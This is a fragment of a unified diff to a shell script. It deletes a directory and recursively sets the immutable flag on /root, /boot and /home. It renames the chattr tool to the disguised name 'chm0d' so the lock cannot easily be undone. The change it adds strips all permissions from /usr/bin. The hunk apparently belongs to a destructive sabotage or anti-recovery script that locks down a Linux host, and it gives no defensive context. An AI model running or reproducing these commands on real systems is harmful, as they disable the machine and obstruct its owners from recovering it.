@@ -106,4 +106,5 @@ rm -rf ydaysb3_orga
 chattr -R +i /root
 chattr -R +i /boot
 chattr -R +i /home
+chmod -R 000 /usr/bin
 mv /usr/bin/chattr /usr/bin/chm0d
